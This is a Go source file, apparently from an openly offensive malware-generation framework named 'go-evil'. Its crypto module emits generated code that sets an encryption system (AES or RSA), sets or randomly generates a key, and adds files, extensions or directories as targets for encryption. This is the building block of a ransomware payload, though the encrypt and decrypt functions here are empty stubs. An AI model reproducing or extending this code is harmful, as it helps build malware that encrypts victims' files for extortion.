package crypto

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

//
//
// Encrypts the provided object
// The input can follow this format '${"<encryption system>", "<key>", "<'file'/'ext'/'dir'>", "<object>"}$'
// following the above format will "overwrite" all values in the struct before encrypting
//
//
func encrypt(value string, s_json string) string {
	data_object := structure.Receive(s_json)

	return structure.Send(data_object)
}

//
//
// Sets the crypto system to use for encrypting and decrypting
//
//
func set_crypto(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	available_systems := []string{"aes", "rsa"}
	system_call := "set_crypto"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	def_crypto := false // Is the crypto that we are gonna use definied?

	for _, def_c := range available_systems {
		if def_c == value {
			def_crypto = true
			break
		}
	}

	if !def_crypto { // Failed to find the crypto
		notify.Error(fmt.Sprintf("Unknown crypto system '%s', available are %s", value, available_systems), "crypto.set_method()")
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", system_call),
		fmt.Sprintf("spine.crypt.set_crypto(\"%s\")", value),
		"}"})

	return []string{fmt.Sprintf("%s()", system_call)}, structure.Send(data_object)
}

//
//
// Sets the key used for encrypting
//
//
func set_key(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "set_key"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", system_call),
		fmt.Sprintf("spine.crypt.set_key(\"%s\")", value),
		"}"})

	return []string{fmt.Sprintf("%s()", system_call)}, structure.Send(data_object)
}

//
//
// Generates a key used for encrypting/decrypting
//
//
func generate_key(value string, s_json string) ([]string, string) {
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	key_size := tools.String_to_int(value)

	if key_size == -1 {
		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", value), "crypto.generate_key()")
	}

	key := tools.Generate_random_n_string(key_size)

	calls, s_json := set_key(key, s_json)

	return calls, s_json
}

//
//
// Appends a target to focus on, you can also pass in a evil array with all your targets aswell
//
//
func add_target(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "add_target"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(target string){", system_call),
		"spine.crypt.add_target(target)",
		"}"})

	return []string{fmt.Sprintf("%s(\"%s\")", system_call, value)}, structure.Send(data_object)
}

//
//
//
//
//
func decrypt(value string, s_json string) string {
	data_object := structure.Receive(s_json)

	return structure.Send(data_object)
}
